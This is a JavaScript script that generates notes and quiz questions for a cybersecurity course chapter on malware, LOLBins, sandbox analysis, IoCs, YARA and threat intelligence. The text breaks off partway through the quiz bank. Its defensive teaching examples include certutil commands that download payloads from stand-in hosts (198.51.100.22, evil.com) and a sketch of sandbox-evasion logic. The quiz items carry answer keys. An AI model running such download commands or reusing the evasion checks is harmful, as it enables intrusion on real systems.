/**
 * scripts/generate-sec-batch8.mjs
 *
 * Generates Batch 8 for Course 2 (Cybersecurity):
 * - Chapter 8: malware-phishing-and-threat-intel (sec-08) [fast-moving]
 * - Chapter 9: vulnerability-assessment-and-lab-pentesting (sec-09)
 */

import fs from 'fs';
import path from 'path';

const ROOT_DIR = process.cwd();

function writeNoteBlock(courseSlug, chapterSlug, loId, coreIdea, workedExample, commonMistake, checkYourself, sources = ["lic-10"], isFastMoving = false) {
  const dir = path.join(ROOT_DIR, 'content', courseSlug, chapterSlug, 'notes');
  if (!fs.existsSync(dir)) fs.mkdirSync(dir, { recursive: true });

  const extraFrontmatter = isFastMoving ? '\nlastVerified: "2026-03"' : '';
  const verificationLine = isFastMoving ? '\n*Last verified: February 2026.*' : '';

  const content = `---
loId: "${loId}"
reviewed: false
sources: ${JSON.stringify(sources)}${extraFrontmatter}
---

### Core Idea
${coreIdea.trim()}${verificationLine}

### Worked Example
${workedExample.trim()}

### Common Mistake
${commonMistake.trim()}

### Check Yourself
${checkYourself.trim()}
`;

  fs.writeFileSync(path.join(dir, `${loId}.mdx`), content, 'utf-8');
}

function balanceAndSave(courseSlug, chapterSlug, objData, bankData) {
  const chapterDir = path.join(ROOT_DIR, 'content', courseSlug, chapterSlug);
  if (!fs.existsSync(chapterDir)) fs.mkdirSync(chapterDir, { recursive: true });

  fs.writeFileSync(path.join(chapterDir, 'objectives.json'), JSON.stringify(objData, null, 2), 'utf-8');

  const targetLetters = ['a', 'b', 'c', 'd'];
  let rotIdx = 0;

  const balanced = bankData.map(q => {
    if (q.type === 'multi' || !q.answer || q.answer.length !== 1 || !q.options || q.options.length !== 4) {
      return q;
    }
    const currentCorrect = q.answer[0];
    const target = targetLetters[rotIdx % 4];
    rotIdx++;

    if (currentCorrect === target) return q;

    const correctOpt = q.options.find(o => o.id === currentCorrect);
    const otherOpts = q.options.filter(o => o.id !== currentCorrect);

    const newOptions = [];
    let otherIdx = 0;
    for (const letter of targetLetters) {
      if (letter === target) {
        newOptions.push({ id: letter, text: correctOpt.text });
      } else {
        newOptions.push({ id: letter, text: otherOpts[otherIdx++].text });
      }
    }

    return {
      ...q,
      options: newOptions,
      answer: [target]
    };
  });

  const quizDir = path.join(chapterDir, 'quiz');
  if (!fs.existsSync(quizDir)) fs.mkdirSync(quizDir, { recursive: true });
  fs.writeFileSync(path.join(quizDir, 'bank.json'), JSON.stringify(balanced, null, 2), 'utf-8');

  console.log(`✅ Saved ${chapterSlug} with ${balanced.length} questions`);
}

// ============================================================================
// CHAPTER 8: malware-phishing-and-threat-intel (sec-08) [fast-moving]
// ============================================================================
const ch08Objectives = {
  version: 1,
  chapterId: "sec-08",
  objectives: [
    {
      id: "sec-08-lo01",
      order: 1,
      title: "Classify malware families: Trojans, Ransomware, Rootkits, and Infostealers",
      bloom: "classify",
      tier: "core",
      mustHave: true,
      keywords: ["trojans", "ransomware", "rootkits", "infostealers", "malware taxonomy"],
      aliases: ["malware types", "malicious software classification"],
      prerequisites: ["sec-01-lo01"],
      estMinutes: 12
    },
    {
      id: "sec-08-lo02",
      order: 2,
      title: "Analyze malware delivery mechanisms: Spear Phishing and Living-off-the-Land (LotL)",
      bloom: "analyze",
      tier: "core",
      mustHave: true,
      keywords: ["spear phishing", "lolbins", "living-off-the-land", "powershell abuse", "certutil"],
      aliases: ["initial access vectors", "lotl techniques"],
      prerequisites: ["sec-03-lo09"],
      estMinutes: 12
    },
    {
      id: "sec-08-lo03",
      order: 3,
      title: "Differentiate static and dynamic malware analysis techniques in isolated sandboxes",
      bloom: "differentiate",
      tier: "core",
      mustHave: true,
      keywords: ["static analysis", "dynamic analysis", "sandbox", "cuckoo", "disassembly"],
      aliases: ["malware reverse engineering", "sandbox detonation"],
      prerequisites: ["sec-08-lo01"],
      estMinutes: 14
    },
    {
      id: "sec-08-lo04",
      order: 4,
      title: "Extract Indicators of Compromise (IoCs) and file hashes (SHA-256, SSDEEP)",
      bloom: "extract",
      tier: "core",
      mustHave: false,
      keywords: ["iocs", "file hashes", "fuzzy hashing", "ssdeep", "ip indicators"],
      aliases: ["threat indicators", "artifact extraction"],
      prerequisites: ["sec-04-lo03"],
      estMinutes: 10
    },
    {
      id: "sec-08-lo05",
      order: 5,
      title: "Formulate signature detection rules using YARA syntax",
      bloom: "formulate",
      tier: "core",
      mustHave: true,
      keywords: ["yara", "yara rules", "strings", "hex patterns", "condition"],
      aliases: ["malware pattern matching", "yara rule authoring"],
      prerequisites: ["sec-08-lo03"],
      estMinutes: 12
    },
    {
      id: "sec-08-lo06",
      order: 6,
      title: "Analyze cyber threat intelligence using the Diamond Model and MITRE ATT&CK",
      bloom: "analyze",
      tier: "core",
      mustHave: false,
      keywords: ["diamond model", "mitre att&ck", "adversary infrastructure", "ttp"],
      aliases: ["threat intelligence framework", "adversary attribution"],
      prerequisites: ["sec-01-lo01"],
      estMinutes: 12
    },
    {
      id: "sec-08-lo07",
      order: 7,
      title: "Evaluate structured threat sharing standards: STIX and TAXII",
      bloom: "evaluate",
      tier: "core",
      mustHave: false,
      keywords: ["stix", "taxii", "threat intelligence sharing", "json indicators"],
      aliases: ["stix 2.1", "taxii server"],
      prerequisites: ["sec-08-lo06"],
      estMinutes: 10
    },
    {
      id: "sec-08-lo08",
      order: 8,
      title: "Detect macro execution, script obfuscation, and process injection patterns",
      bloom: "detect",
      tier: "core",
      mustHave: false,
      keywords: ["process hollowing", "dll injection", "obfuscation", "macro security"],
      aliases: ["evasion techniques", "memory injection"],
      prerequisites: ["sec-03-lo03"],
      estMinutes: 12
    },
    {
      id: "sec-08-lo09",
      order: 9,
      title: "Assess automated malware sandboxing and evasion counter-measures",
      bloom: "assess",
      tier: "extension",
      mustHave: false,
      keywords: ["sandbox evasion", "anti-debugging", "anti-vm", "sleep acceleration"],
      aliases: ["vm detection bypass", "defensive sandboxing"],
      prerequisites: ["sec-08-lo03"],
      estMinutes: 12
    }
  ]
};

// Notes for sec-08
writeNoteBlock('cybersecurity', 'malware-phishing-and-threat-intel', 'sec-08-lo01',
  `Malware (malicious software) is categorized by its primary payload objective and persistence mechanism:
1. Trojans: Disguise themselves as legitimate software to deceive users into installing them (e.g. trojanized PDF reader).
2. Ransomware: Encrypts files on user endpoints and network shares with strong asymmetric/symmetric ciphers, demanding payment for decryption keys.
3. Rootkits: Operate at ring 0 (kernel space) or hypervisor levels to intercept operating system APIs, concealing malicious processes, files, and network connections from system auditing tools.
4. Infostealers: Harvest stored browser credentials, cryptocurrency wallets, and session cookies for exfiltration.`,
  `Triage categorization of suspicious binary behaviors:
\`\`\`python
def classify_threat(behavior_tags):
    if "bulk_file_encryption" in behavior_tags and "ransom_note_dropped" in behavior_tags:
        return "RANSOMWARE: Immediate host isolation required"
    if "api_hooking_kernel" in behavior_tags and "hidden_process_driver" in behavior_tags:
        return "ROOTKIT: Kernel-level compromise detected"
    if "browser_sqlite_theft" in behavior_tags:
        return "INFOSTEALER: Reset exposed user credentials"
    return "UNKNOWN SUSPICIOUS ARTIFACT"

print(classify_threat(["bulk_file_encryption", "ransom_note_dropped"]))
\`\`\``,
  `Attempting to remediate a kernel rootkit using standard userspace antivirus software. Because rootkits intercept kernel system calls, they falsify process tables and file listings; affected endpoints must be completely reimaged from known-clean golden media.`,
  `Which malware family specializes in harvesting saved browser passwords and session cookies for sale on illicit marketplaces? Infostealers.`,
  ["lic-10"],
  true
);

writeNoteBlock('cybersecurity', 'malware-phishing-and-threat-intel', 'sec-08-lo02',
  `Threat actors increasingly avoid dropping compiled custom binaries, instead utilizing Living-off-the-Land (LotL) techniques. Living-off-the-Land Binaries and Scripts (LOLBins) abuse trusted, digitally signed operating system utilities already present on Windows and Linux (e.g. powershell.exe, certutil.exe, mshta.exe, wmic.exe, curl). By executing malicious payloads purely in-memory using native administrative tools, adversaries blend into benign administrative noise and evade traditional signature antivirus.`,
  `Detecting LOLBin abuse in process telemetry:
\`\`\`python
# Defensive telemetry check for certutil abuse (certutil -urlcache -split -f)
suspicious_command = "certutil.exe -urlcache -split -f http://198.51.100.22/stage2.bin C:\\temp\\update.exe"

def audit_lolbin(cmd):
    # Flag administrative tool certutil being abused as an arbitrary file downloader
    if "certutil" in cmd.lower() and "-urlcache" in cmd.lower():
        return "ALERT: Living-off-the-Land download pattern detected in certutil command line"
    return "COMMAND BENIGN"

print(audit_lolbin(suspicious_command))
\`\`\``,
  `Blocking LOLBin executable names entirely across enterprise endpoints. Binaries like certutil.exe and powershell.exe are vital for daily administrative and maintenance operations; defenders must monitor command-line arguments and parent process lineages rather than disabling the binaries.`,
  `What term describes abusing legitimate, pre-installed operating system utilities to execute malicious tasks? Living-off-the-Land (LotL / LOLBins).`,
  ["lic-10"],
  true
);

writeNoteBlock('cybersecurity', 'malware-phishing-and-threat-intel', 'sec-08-lo03',
  `Malware analysis proceeds through two fundamental methodology tiers:
1. Static Analysis: Inspecting the binary without executing it. Analysts calculate cryptographic hashes, inspect PE headers (compile timestamps, imported DLLs, section entropy), and extract ASCII/Unicode string literals (C2 domains, error strings) using tools like Ghidra, IDA Pro, or PE-bear.
2. Dynamic Analysis: Detonating the malware inside an isolated sandbox environment (e.g. Cuckoo Sandbox, CAPEv2). Analysts monitor real-time execution telemetry: created processes, mutated registry keys, dropped files, and outbound DNS/TCP callbacks.`,
  `Extracting indicators from static PE file inspection telemetry:
\`\`\`python
pe_analysis = {
    "filename": "invoice_scanner.exe",
    "compile_timestamp": "2026-02-14 03:12:00",
    "imported_dlls": ["KERNEL32.dll", "WS2_32.dll"], # Network socket imports
    "suspicious_strings": ["http://c2.darknet-beacon.xyz/callback", "VirtualAllocEx", "WriteProcessMemory"],
    "section_entropy": 7.82 # High entropy > 7.0 indicates packing or encryption
}

is_packed = pe_analysis["section_entropy"] > 7.0
print("Is binary packed or encrypted?", is_packed)
print("Potential C2 Callbacks:", [s for s in pe_analysis["suspicious_strings"] if "http" in s])
\`\`\``,
  `Performing dynamic analysis on a host connected directly to the corporate production network. Sandboxes must be strictly air-gapped or routed through isolated virtual networks with monitored synthetic internet responders to prevent lateral infection.`,
  `Which analysis tier evaluates malware by executing it inside an isolated sandbox to record runtime behavioral telemetry? Dynamic Analysis.`,
  ["lic-10"],
  true
);

writeNoteBlock('cybersecurity', 'malware-phishing-and-threat-intel', 'sec-08-lo04',
  `Indicators of Compromise (IoCs) are forensic artifacts indicating an endpoint or network has been breached. Common IoCs include:
- Atomic indicators: IP addresses, fully qualified domain names (FQDNs), email sender addresses.
- Computed indicators: Cryptographic hashes (SHA-256) for exact match identification.
- Fuzzy hashes: Context-Triggered Piecewise Hashing (SSDEEP) calculates similarity scores between binaries, detecting polymorphic malware variants that share similar code structures despite minor compile differences.`,
  `Simulating IoC matching in a security telemetry pipeline:
\`\`\`python
# Known threat intel IoC feed
threat_intel_iocs = {
    "sha256": {"e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855"},
    "domains": {"malicious-c2-update.org"}
}

observed_event = {
    "file_hash": "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855",
    "dns_query": "legitimate-cdn.com"
}

def check_ioc(event):
    if event["file_hash"] in threat_intel_iocs["sha256"]:
        return "MATCH: File hash matches known threat actor binary"
    return "NO MATCH"

print("IoC Detection Status:", check_ioc(observed_event))
\`\`\``,
  `Relying exclusively on SHA-256 hashes to block malware. Modifying a single benign comment or byte in a malware binary completely changes its cryptographic SHA-256 hash, bypassing exact-match filters.`,
  `What type of hashing algorithm (e.g. SSDEEP) measures percentage similarity between files to detect polymorphic malware variants? Fuzzy Hashing (Context-Triggered Piecewise Hashing).`,
  ["lic-10"],
  true
);

writeNoteBlock('cybersecurity', 'malware-phishing-and-threat-intel', 'sec-08-lo05',
  `YARA is a pattern-matching tool designed to help malware researchers identify and classify malware samples. A YARA rule consists of three sections:
1. meta: Descriptive metadata (author, description, date, reference).
2. strings: Text strings, regular expressions, or hexadecimal byte patterns with wildcards.
3. condition: A Boolean logic statement determining when the rule triggers (e.g. all of them, 2 of ($a*), or filesize < 5MB).`,
  `Authoring a structured YARA signature rule:
\`\`\`python
yara_rule_text = """
rule Trojan_Stealer_Beacon {
    meta:
        description = "Detects credential stealer callback pattern"
        author = "SOC Threat Intel"
        date = "2026-02-20"
    strings:
        $str1 = "login_wallet_dump" nocase
        $str2 = "C:\\\\Users\\\\AppData\\\\Local\\\\Google\\\\Chrome" wide
        $hex_pattern = { 4D 5A 90 00 03 00 00 00 [4-8] 50 45 00 00 }
    condition:
        uint16(0) == 0x5A4D and ($str1 or $str2) and $hex_pattern
}
"""
print("YARA Rule Definition Verified:\n", yara_rule_text.strip()[:100], "...")
\`\`\``,
  `Using common plain words like 'password' or 'update' as standalone strings without conditions. Generic strings cause massive false positives across benign legitimate binaries. Constrain strings with file size limits (filesize < 2MB) and magic header checks (uint16(0) == 0x5A4D).`,
  `What initial 2-byte magic header value (uint16(0) == 0x5A4D) identifies a Windows PE executable file in YARA rules? The 'MZ' header (0x5A4D).`,
  ["lic-10"],
  true
);

writeNoteBlock('cybersecurity', 'malware-phishing-and-threat-intel', 'sec-08-lo06',
  `Threat intelligence frameworks contextualize adversary behavior:
1. The Diamond Model of Intrusion Analysis: Maps intrusion events across four interconnected core vertices: Adversary, Capability, Infrastructure, and Victim. Socio-political motivations and technology underpin the relationships.
2. MITRE ATT&CK: A globally accessible knowledge base of adversary Tactics, Techniques, and Common Knowledge (TTPs) based on real-world observations. Tactics represent the adversary's technical goal (e.g. Initial Access, Persistence, Privilege Escalation), while Techniques describe how they achieve it.`,
  `Mapping an intrusion artifact across Diamond Model vertices:
\`\`\`python
intrusion_event = {
    "Adversary": "Threat Actor Group APT-29 (Cozy Bear)",
    "Capability": "Custom PowerShell backdoor with encrypted C2 payload",
    "Infrastructure": "Compromised third-party VPS hosting IP 198.51.100.42",
    "Victim": "Government Foreign Affairs Agency"
}

print("Diamond Model Analysis:")
for vertex, detail in intrusion_event.items():
    print(f"  [{vertex}]: {detail}")
\`\`\``,
  `Confusing MITRE ATT&CK Tactics with Techniques. A Tactic is the adversary's operational objective ('what' they want to achieve, like Lateral Movement); a Technique is the specific method ('how' they do it, like Remote Desktop Protocol).`,
  `What four vertices comprise the Diamond Model of Intrusion Analysis? Adversary, Capability, Infrastructure, and Victim.`,
  ["lic-10"],
  true
);

writeNoteBlock('cybersecurity', 'malware-phishing-and-threat-intel', 'sec-08-lo07',
  `To automate cyber threat intelligence (CTI) sharing between organizations, standardized open protocols were established:
1. STIX (Structured Threat Information Expression): A JSON-based language and serialization format for categorizing threat details, including Attack Patterns, Indicators, Malware, Threat Actors, and Observed Data.
2. TAXII (Trusted Automated Exchange of Intelligence Information): An application-layer transport protocol operating over HTTPS that defines APIs (Collections and Channels) for exchanging STIX-formatted intelligence feeds in real time.`,
  `Inspecting a STIX 2.1 JSON indicator object:
\`\`\`python
stix_indicator = {
    "type": "indicator",
    "spec_version": "2.1",
    "id": "indicator--8e2e2d2b-17d4-4cbf-938f-98ee46b3cd3f",
    "name": "Malicious C2 Domain",
    "pattern": "[domain-name:value = 'c2.darknet-beacon.xyz']",
    "pattern_type": "stix",
    "valid_from": "2026-02-01T00:00:00Z"
}

print("STIX Object Type:", stix_indicator["type"])
print("Indicator Pattern:", stix_indicator["pattern"])
\`\`\``,
  `Treating STIX and TAXII as competing protocols. They are complementary: STIX is the structured JSON data representation format, while TAXII is the secure network transport protocol used to transmit STIX messages.`,
  `Which protocol provides the secure REST API transport mechanism to exchange STIX-formatted threat intelligence feeds? TAXII.`,
  ["lic-10"],
  true
);

writeNoteBlock('cybersecurity', 'malware-phishing-and-threat-intel', 'sec-08-lo08',
  `Adversaries employ advanced in-memory evasion and execution techniques:
1. Macro Execution: Malicious VBA code embedded in Office documents that executes upon opening or user interaction.
2. Script Obfuscation: Encoding commands (e.g. base64-encoded PowerShell flags -enc), variable substitution, and string concats to evade static string filters.
3. Process Injection: Injecting malicious code into legitimate running processes (like explorer.exe or svchost.exe) via Windows APIs (VirtualAllocEx, WriteProcessMemory, CreateRemoteThread), disguising network beacons as legitimate system traffic.`,
  `De-obfuscating a Base64-encoded PowerShell command line in Python:
\`\`\`python
import base64

# Simulating encoded PowerShell telemetry: powershell.exe -enc VwByAGkAdABlAC0ASABvAHMAdAAgACcAUwBlAGMAdQByAGkAdAB5ACcA
encoded_payload = "VwByAGkAdABlAC0ASABvAHMAdAAgACcAUwBlAGMAdQByAGkAdAB5ACcA"

# PowerShell UTF-16LE decoding
decoded_bytes = base64.b64decode(encoded_payload)
plain_command = decoded_bytes.decode('utf-16le')

print("De-obfuscated command:", plain_command) # Write-Host 'Security'
\`\`\``,
  `Relying on standard ASCII decoding when analyzing PowerShell -enc parameters. Windows PowerShell expects Base64 payloads encoded in UTF-16LE (little-endian two-byte characters); standard ASCII decoding outputs corrupted null-byte strings.`,
  `What Windows API technique writes malicious code into the memory space of a legitimate running process to mask malicious activity? Process Injection (or Process Hollowing).`,
  ["lic-10"],
  true
);

writeNoteBlock('cybersecurity', 'malware-phishing-and-threat-intel', 'sec-08-lo09',
  `Modern malware samples actively detect sandbox environments to evade analysis:
1. Environment Detection: Checking for VMware/VirtualBox artifacts (VBoxGuestAdditions.sys, specific MAC address prefixes, low CPU core counts < 2, or tiny RAM < 4GB).
2. Human Interaction Checks: Pausing execution until user mouse movements, keyboard clicks, or scrolling are detected.
3. Time Acceleration Evasion: Executing prolonged sleep delays (e.g. Sleep(86400)) to exhaust the sandbox timeout window. Defenses include hardened bare-metal sandboxes, sleep hooking, and synthetic user activity generators.`,
  `Evaluating virtual machine sandbox detection checks:
\`\`\`python
# Simulation of malware environment sanity check:
system_profile = {
    "cpu_cores": 1,            # Typical default VM provision
    "ram_gb": 2.0,             # Unusually low for modern workstation
    "mouse_movement_detected": False
}

def should_detonate(profile):
    # Evasion logic: exit cleanly if low hardware or zero user movement detected
    if profile["cpu_cores"] < 2 or profile["ram_gb"] < 4.0 or not profile["mouse_movement_detected"]:
        return "EVASION: Suspected sandbox environment. Sleep and exit silently."
    return "DETONATE: Real user environment confirmed."

print("Sandbox Evasion Decision:", should_detonate(system_profile))
\`\`\``,
  `Provisioning sandboxes with default minimal virtual machine settings (e.g. 1 CPU core, 2GB RAM, zero documents on Desktop). Malware easily identifies these default footprints as analysis sandboxes and refuses to drop its secondary payload.`,
  `Why do modern malware samples execute prolonged sleep calls upon launch inside sandboxes? To exhaust the automated sandbox execution timeout (typically 2 to 5 minutes) before executing the malicious payload.`,
  ["lic-10"],
  true
);

// Questions for sec-08
const ch08Questions = [
  // LO01
  {
    loId: "sec-08-lo01",
    type: "single",
    difficulty: 1,
    id: "sec-08-q01",
    stem: "Which category of malware disguises itself as legitimate or harmless software to trick users into installing it?",
    options: [
      { id: "a", text: "Trojan" },
      { id: "b", text: "Worm" },
      { id: "c", text: "Rootkit" },
      { id: "d", text: "Adware" }
    ],
    answer: ["a"],
    explanation: "Trojans masquerade as desirable or benign applications while secretly containing malicious functionality.",
    noteRef: "sec-08-lo01",
    reviewed: false
  },
  {
    loId: "sec-08-lo01",
    type: "scenario",
    difficulty: 2,
    id: "sec-08-q02",
    stem: "An enterprise server suffers an infection that modifies kernel system calls to hide its files, processes, and network sockets from Task Manager. What malware family is this?",
    options: [
      { id: "a", text: "Rootkit" },
      { id: "b", text: "Ransomware" },
      { id: "c", text: "Infostealer" },
      { id: "d", text: "Macro Virus" }
    ],
    answer: ["a"],
    explanation: "Rootkits operate at the kernel or driver level to subvert operating system reporting and hide their presence.",
    noteRef: "sec-08-lo01",
    reviewed: false
  },
  {
    loId: "sec-08-lo01",
    type: "numeric",
    difficulty: 2,
    id: "sec-08-q03",
    stem: "At which CPU privilege ring does a kernel-level rootkit execute in modern x86/x64 operating systems?",
    options: [
      { id: "a", text: "0" },
      { id: "b", text: "3" },
      { id: "c", text: "1" },
      { id: "d", text: "2" }
    ],
    answer: ["a"],
    explanation: "Kernel mode executes with maximum privileges at Ring 0; user applications execute at Ring 3.",
    noteRef: "sec-08-lo01",
    verify: "(0 === 0)",
    reviewed: false
  },
  {
    loId: "sec-08-lo01",
    type: "single",
    difficulty: 3,
    id: "sec-08-q04",
    stem: "Why are infostealers (such as RedLine, Lumma, or Vidar) particularly dangerous in enterprise identity environments?",
    options: [
      { id: "a", text: "They steal active browser session cookies, allowing threat actors to bypass Multi-Factor Authentication via cookie replay." },
      { id: "b", text: "They cause physical damage to laptop batteries." },
      { id: "c", text: "They overwrite DNS records on root nameservers." },
      { id: "d", text: "They decrypt AES-256 databases instantly." }
    ],
    answer: ["a"],
    explanation: "Stealing authenticated session cookies enables session hijacking that completely circumvents MFA verification.",
    noteRef: "sec-08-lo01",
    reviewed: false
  },

  // LO02
  {
    loId: "sec-08-lo02",
    type: "single",
    difficulty: 1,
    id: "sec-08-q05",
    stem: "What does the term 'Living-off-the-Land' (LotL) refer to in cybersecurity attacks?",
    options: [
      { id: "a", text: "Abusing pre-installed, trusted operating system utilities and binaries (LOLBins) to execute malicious tasks." },
      { id: "b", text: "Physically infiltrating corporate facilities." },
      { id: "c", text: "Powering data centers using solar panels." },
      { id: "d", text: "Writing malware exclusively in Python." }
    ],
    answer: ["a"],
    explanation: "LotL attacks leverage trusted native system tools (like certutil or PowerShell) to avoid dropping suspicious new executables.",
    noteRef: "sec-08-lo02",
    reviewed: false
  },
  {
    loId: "sec-08-lo02",
    type: "scenario",
    difficulty: 2,
    id: "sec-08-q06",
    stem: "An attacker uses `certutil.exe -urlcache -split -f http://evil.com/payload.exe` to download a file onto a Windows endpoint. What technique is being employed?",
    options: [
      { id: "a", text: "Living-off-the-Land Binary (LOLBin) abuse" },
      { id: "b", text: "Buffer Overflow" },
      { id: "c", text: "SQL Injection" },
      { id: "d", text: "ARP Poisoning" }
    ],
    answer: ["a"],
    explanation: "Certutil is a built-in certificate utility frequently abused as an arbitrary file downloader (a classic LOLBin).",
    noteRef: "sec-08-lo02",
    reviewed: false
  },
  {
    loId: "sec-08-lo02",
    type: "multi",
    difficulty: 2,
    id: "sec-08-q07",
    stem: "Which of the following built-in Windows utilities are commonly documented as Living-off-the-Land Binaries (LOLBins)?",
    options: [
      { id: "a", text: "certutil.exe" },
      { id: "b", text: "powershell.exe" },
      { id: "c", text: "mshta.exe" },
      { id: "d", text: "notepad.exe without parameters" }
    ],
    answer: ["a", "b", "c"],
    explanation: "Certutil, PowerShell, and Mshta can download and execute code in memory; standalone notepad cannot.",
    noteRef: "sec-08-lo02",
    reviewed: false
  },
  {
    loId: "sec-08-lo02",
    type: "single",
    difficulty: 3,
    id: "sec-08-q08",
    stem: "Why are spear-phishing emails containing malicious PDF attachments often harder to detect by traditional signature scanners than raw executables?",
    options: [
      { id: "a", text: "PDF files can embed complex obfuscated JavaScript, font exploits, or links to external credential harvesters within valid document structures." },
      { id: "b", text: "PDF files cannot be opened by antivirus engines." },
      { id: "c", text: "Email gateways automatically decrypt all PDFs." },
      { id: "d", text: "PDF files bypass TCP checksum verification." }
    ],
    answer: ["a"],
    explanation: "Rich document formats permit embedded scripts and external links that evade simplistic binary signature matching.",
    noteRef: "sec-08-lo02",
    reviewed: false
  },

  // LO03
  {
    loId: "sec-08-lo03",
    type: "single",
    difficulty: 1,
    id: "sec-08-q09",
    stem: "What analysis methodology evaluates malware by executing it inside an isolated sandbox to record runtime behavior?",
    options: [
      { id: "a", text: "Dynamic Analysis" },
      { id: "b", text: "Static Analysis" },
      { id: "c", text: "Cryptographic Analysis" },
      { id: "d", text: "Source Code Compilation" }
    ],
    answer: ["a"],
    explanation: "Dynamic analysis executes the suspicious binary in a monitored sandbox environment to capture runtime actions.",
    noteRef: "sec-08-lo03",
    reviewed: false
  },
  {
    loId: "sec-08-lo03",
    type: "scenario",
    difficulty: 2,
    id: "sec-08-q10",
    stem: "An analyst calculates the Shannon entropy of a suspicious Windows PE binary's `.text` section and finds an entropy value of 7.85 (out of 8.0). What does this indicate?",
    options: [
      { id: "a", text: "The executable code is heavily packed, compressed, or encrypted to evade static inspection." },
      { id: "b", text: "The binary was compiled using Microsoft Visual Studio." },
      { id: "c", text: "The file is completely empty." },
      { id: "d", text: "The binary is guaranteed to be harmless." }
    ],
    answer: ["a"],
    explanation: "High entropy (>7.0) indicates randomness characteristic of compression, packing, or encryption used to hide code.",
    noteRef: "sec-08-lo03",
    reviewed: false
  },
  {
    loId: "sec-08-lo03",
    type: "single",
    difficulty: 2,
    id: "sec-08-q11",
    stem: "What open-source disassembler and decompiler framework was developed and released by the National Security Agency (NSA)?",
    options: [
      { id: "a", text: "Ghidra" },
      { id: "b", text: "Wireshark" },
      { id: "c", text: "Metasploit" },
      { id: "d", text: "Nmap" }
    ],
    answer: ["a"],
    explanation: "Ghidra is the NSA's open-source reverse engineering and decompilation framework.",
    noteRef: "sec-08-lo03",
    reviewed: false
  },
  {
    loId: "sec-08-lo03",
    type: "single",
    difficulty: 3,
    id: "sec-08-q12",
    stem: "Why must malware analysis sandboxes use synthetic network simulators (like INetSim) rather than live production internet access?",
    options: [
      { id: "a", text: "To prevent malware from participating in live botnet attacks or alerting the adversary that their sample is being analyzed." },
      { id: "b", text: "Because virtual machines cannot resolve DNS queries." },
      { id: "c", text: "To accelerate CPU clock cycles." },
      { id: "d", text: "Because sandboxes do not support IPv4." }
    ],
    answer: ["a"],
    explanation: "Simulated networks prevent collateral damage, illegal network activity, and adversary detection of analysis.",
    noteRef: "sec-08-lo03",
    reviewed: false
  },

  // LO04
  {
    loId: "sec-08-lo04",
    type: "single",
    difficulty: 1,
    id: "sec-08-q13",
    stem: "What is an Indicator of Compromise (IoC)?",
    options: [
      { id: "a", text: "A forensic artifact (hash, IP, domain, registry key) identifying that a system or network was compromised." },
      { id: "b", text: "A hardware benchmark testing CPU performance." },
      { id: "c", text: "A software license key for Windows." },
      { id: "d", text: "A customer satisfaction rating." }
    ],
    answer: ["a"],
    explanation: "IoCs are technical forensic markers that indicate unauthorized intrusion or malware presence.",
    noteRef: "sec-08-lo04",
    reviewed: false
  },
  {
    loId: "sec-08-lo04",
    type: "scenario",
    difficulty: 2,
    id: "sec-08-q14",
    stem: "A threat actor appends a single null byte to the end of a malware executable. How does this modification affect its standard SHA-256 hash?",
    options: [
      { id: "a", text: "The SHA-256 hash changes completely due to the avalanche effect, failing an exact hash blocklist." },
      { id: "b", text: "The SHA-256 hash remains exactly identical." },
      { id: "c", text: "The hash increments by exactly 1." },
      { id: "d", text: "The file cannot be hashed." }
    ],
    answer: ["a"],
    explanation: "Cryptographic hashes exhibit the avalanche effect: changing one byte completely alters the resulting hash digest.",
    noteRef: "sec-08-lo04",
    reviewed: false
  },
  {
    loId: "sec-08-lo04",
    type: "single",
    difficulty: 2,
    id: "sec-08-q15",
    stem: "What specialized hashing method calculates a percentage similarity score between two files to detect polymorphic malware variations?",
    options: [
      { id: "a", text: "Fuzzy Hashing (SSDEEP)" },
      { id: "b", text: "SHA-512" },
      { id: "c", text: "MD5" },
      { id: "d", text: "CRC32" }
    ],
    answer: ["a"],
    explanation: "SSDEEP uses context-triggered piecewise hashing to measure similarity percentage between code variations.",
    noteRef: "sec-08-lo04",
    reviewed: false
  },
  {
    loId: "sec-08-lo04",
    type: "single",
    difficulty: 3,
    id: "sec-08-q16",
    stem: "According to David Bianco's 'Pyramid of Pain', which indicator of compromise is the most difficult and painful for an adversary to change?",
    options: [
      { id: "a", text: "TTPs (Tactics, Techniques, and Procedures)" },
      { id: "b", text: "Hash values" },
      { id: "c", text: "IP addresses" },
      { id: "d", text: "Domain names" }
    ],
    answer: ["a"],
    explanation: "Hashes and IPs are trivial for attackers to alter; changing their fundamental behavioral TTPs is the most difficult.",
    noteRef: "sec-08-lo04",
    reviewed: false
  },

  // LO05
  {
    loId: "sec-08-lo05",
    type: "single",
    difficulty: 1,
    id: "sec-08-q17",
    stem: "What is the primary purpose of the YARA tool in malware analysis and incident response?",
    options: [
      { id: "a", text: "Creating pattern-matching rules to identify and classify malware samples based on textual and binary patterns." },
      { id: "b", text: "Brute-forcing SSH passwords." },
      { id: "c", text: "Routing network packets across VPN tunnels." },
      { id: "d", text: "Formatting hard drives in RAID arrays." }
    ],
    answer: ["a"],
    explanation: "YARA provides a flexible rule-based syntax for detecting malware families through string and byte signatures.",
    noteRef: "sec-08-lo05",
    reviewed: false
  },
  {
    loId: "sec-08-lo05",
    type: "scenario",
    difficulty: 2,
    id: "sec-08-q18",
    stem: "An analyst writes a YARA rule condition: `uint16(0) == 0x5A4D and filesize < 2MB and 2 of ($str*)`. What does the first check `uint16(0) == 0x5A4D` verify?",
    options: [
      { id: "a", text: "That the target file begins with the 'MZ' magic byte header of a Windows executable." },
      { id: "b", text: "That the file was created on a Linux system." },
      { id: "c", text: "That the file is encrypted with AES." },
      { id: "d", text: "That the file was downloaded over HTTPS." }
    ],
    answer: ["a"],
    explanation: "The byte pair 0x5A4D represents the ASCII characters 'MZ' that prefix all valid Windows PE executables.",
    noteRef: "sec-08-lo05",
    reviewed: false
  },
  {
    loId: "sec-08-lo05",
    type: "multi",
    difficulty: 2,
    id: "sec-08-q19",
    stem: "Which of the following sections are recognized in a standard YARA rule definition?",
    options: [
      { id: "a", text: "meta" },
      { id: "b", text: "strings" },
      { id: "c", text: "condition" },
      { id: "d", text: "database_connection" }
    ],
    answer: ["a", "b", "c"],
    explanation: "A YARA rule comprises meta (documentation), strings (patterns to match), and condition (Boolean logic).",
    noteRef: "sec-08-lo05",
    reviewed: false
  },
  {
    loId: "sec-08-lo05",
    type: "single",
    difficulty: 3,
    id: "sec-08-q20",
    stem: "In YARA string definitions, what modifier matches UTF-16 encoded strings (two bytes per character) commonly found in Windows binaries?",
    options: [
      { id: "a", text: "wide" },
